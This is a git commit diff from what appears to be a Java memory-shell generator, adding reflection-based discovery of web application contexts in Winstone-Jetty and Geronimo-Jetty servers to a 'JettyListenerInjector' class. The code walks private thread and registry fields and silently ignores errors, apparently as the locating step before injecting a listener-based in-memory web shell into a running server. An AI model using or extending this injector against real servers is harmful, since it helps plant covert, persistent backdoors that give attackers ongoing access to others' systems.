aeed8bcca8f82d6932f070724e4d335e294a629b
su18 <su18@javaweb.org>
2026-06-12 11:47:43 +0800

    feat(jetty): add Winstone-Jetty and Geronimo-Jetty context discovery support

--- generator/src/main/java/com/reajason/javaweb/memshell/injector/jetty/JettyListenerInjector.java
+++ generator/src/main/java/com/reajason/javaweb/memshell/injector/jetty/JettyListenerInjector.java
@@ -101,6 +101,34 @@ public class JettyListenerInjector {
                 }
             } catch (Exception ignored) {
             }
+
+            // Winstone-Jetty: Launcher -> HostGroup -> HostConfigs -> webapps
+            try {
+                Object target = getFieldValue(thread, "target");
+                if (target != null && target.getClass().getName().contains("winstone.Launcher")) {
+                    java.util.Map hostConfigs = (java.util.Map) getFieldValue(getFieldValue(target, "hostGroup"), "hostConfigs");
+                    java.util.Iterator _it3 = hostConfigs.values().iterator();
+                    while (_it3.hasNext()) {
+                        java.util.Map apps = (java.util.Map) getFieldValue(_it3.next(), "webapps");
+                        contexts.addAll(apps.values());
+                    }
+                }
+            } catch (Throwable ignored) {
+            }
+
+            // Geronimo-Jetty
+            try {
+                java.util.Map map = (java.util.Map) getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(thread, "target"), "listener"), "kernel"), "registry"), "instanceRegistry");
+                java.util.Iterator _it2 = map.keySet().iterator();
+                while (_it2.hasNext()) {
+                    Object object = _it2.next();
+                    if (object.getClass().getName().equals("org.apache.geronimo.jetty7.WebAppContextWrapper")) {
+                        contexts.add(getFieldValue(object, "webAppContext"));
+                    }
+                }
+            } catch (Throwable ignored) {
+            }
+
         }
         return contexts;
     }
